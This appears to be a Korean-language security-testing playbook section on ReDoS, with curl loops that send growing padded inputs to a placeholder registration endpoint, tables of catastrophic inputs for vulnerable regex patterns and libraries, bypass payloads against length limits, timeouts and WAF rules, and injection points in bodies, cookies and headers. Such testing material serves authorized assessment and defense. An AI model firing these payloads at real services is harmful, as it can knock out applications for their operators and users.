### 기본 페이로드

**기준선 측정 (필수):**
```bash
# 정상 입력 3회 평균
for i in 1 2 3; do
  curl -w "%{time_total}\n" -o /dev/null -s -X POST "https://target/api/register" \
    -H "Content-Type: application/json" -d '{"email":"normal@test.com"}'
done
```

**점진적 길이 증가 페이로드 (catastrophic backtracking):**

phase1에서 식별한 취약 정규식의 반복 그룹에 매치하는 문자 + 마지막에 불일치 문자.

```bash
for n in 10 15 20 25 30 35; do
  pad=$(printf 'a%.0s' $(seq 1 $n))
  for i in 1 2 3; do
    curl -w "n=$n try=$i time=%{time_total}\n" -m 30 -o /dev/null -s \
      -X POST "https://target/api/register" -H "Content-Type: application/json" \
      -d "{\"email\":\"${pad}!\"}"
  done
done
```

**정규식 패턴별 catastrophic 입력:**

| 취약 패턴 | catastrophic 입력 |
|---|---|
| `(a+)+` | `aaaaaaaaaaaaaaaaaaaaa!` |
| `(a*)*` | `aaaaaaaaaaaaaaaaaaaaa!` |
| `(a\|ab)+` | `ababababababababababab!` |
| `(a\|a?)+` | `aaaaaaaaaaaaaaaaaaaaaa!` |
| `^(.*)*$` | `aaaaaaaaaaaaaaaaaaaa!` |
| `(\w+)+$` | `aaaaaaaaaaaaaaaaaaaa!` |
| `(\d+)*\d+` | `1111111111111111111X` |
| 이메일 (RFC 흉내) | `aaaa@aaaa.aaaa.aaaa.aaaa.aaaa.aa!` |
| URL | `http://aaaaaaaaaaaaaaaaaa@!` |
| `(.*?)+` (lazy) | `aaaaaaaaaaaaaaaaaaaa!` |

**Library/version-specific 페이로드:**

| 라이브러리 | 페이로드 |
|---|---|
| `path-to-regexp` < 6.x (CVE-2024-45296) | route 자체 ReDoS — 라우트 정의 시점 트리거 |
| `xml2js` 구버전 | XML attribute 파싱 (특정 형식 attribute) |
| `validator.js` `isURL`/`isEmail` 일부 버전 | 매우 긴 도메인/email |
| `markdown-it`/`marked` 구버전 | 특정 문법 (테이블, 링크, 이미지) |
| `moment.js` 파싱 | 특정 ISO 8601 변형 |
| `semver` 구버전 | 매우 긴 version 문자열 |

**Time-based 측정 (curl `-m 30`):**
```bash
# 타임아웃 30초 — 취약 시 30초까지 매달림
curl -m 30 -w "%{time_total}\n" -o /dev/null -s "https://target/api/x?input=$(python3 -c 'print("a"*30+"!")')"
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 입력 길이 제한 (256자) | 짧은 입력으로도 catastrophic — `(a+)+` 패턴은 30자에 수 초 |
| 타임아웃 설정 (10초) | 동시 요청 N개로 서비스 고갈 — 100ms 단축 권장 |
| 단일 정규식 RE2 이식 | 다른 정규식은 NFA 잔존 — 전체 코드베이스 점검 필요 |
| `new RegExp(escape(input))` (regex injection 방어) | 긴 literal 자체는 매칭 부담 여전 |
| Possessive quantifier 일부만 적용 | 다른 부분 취약 잔존 |
| RE2 + 일부 NFA 혼용 | RE2 이식 안 된 정규식 식별 후 공격 |

**다양한 입력 길이 + 입력 컨텍스트:**
```
# JSON body
{"email":"aaaa...!"}

# Query string
?email=aaaa...!

# Cookie
Cookie: filter=aaaa...!

# Header (User-Agent)
User-Agent: aaaa...!

# Form body
email=aaaa...!&name=normal
```

---

### 참고사항

- Node.js는 단일 스레드 — 1개 ReDoS가 전체 서비스 블로킹 → 영향도 가장 큼
- Go regexp/Rust regex는 RE2 기반 (선형 시간 보장) — 패턴 매칭 차단
- .NET `MatchTimeout` 설정 시 패턴 매칭 자체는 가능하나 시간 제한
- 이메일 정규식이 가장 흔한 취약 패턴 — RFC 5322 흉내가 다수 CVE
- WAF 자체의 정규식이 ReDoS 게이트가 되는 경우도 있음 (방어 도구가 공격 면)
- JSON Schema validator의 `pattern` 키에 사용자 schema 허용 시 ReDoS
- 동적 테스트 시 sandbox 환경에서만 — prod에선 실제 DoS 위험
- 측정 도중 다른 endpoint 응답 시간도 모니터링 (서비스 전체 블로킹 확인)
- 길이 5자 증가마다 응답 시간이 2배 이상 증가하면 catastrophic backtracking 확인됨
- 30초 타임아웃 도달 시 즉시 확인됨 판정 (timeout)
- 입력 검증 에러로 조기 반환되면 정규식 진입 전 차단 — 안전
- input length를 Phase 1에서 확인된 검증 한도까지 시도 (256자가 한도면 250자까지)
- ReDoS 측정은 서비스 영향 큰 작업 — 최소 횟수 (3회)만 시도하고 일관성 확인되면 중단
- `path-to-regexp` 같은 라우터 ReDoS는 라우트 정의 자체 — 어떤 입력이든 동일 효과
- WAF 우회: Cloudflare/AWS WAF의 정규식 룰 자체에 ReDoS 시 WAF가 증폭기
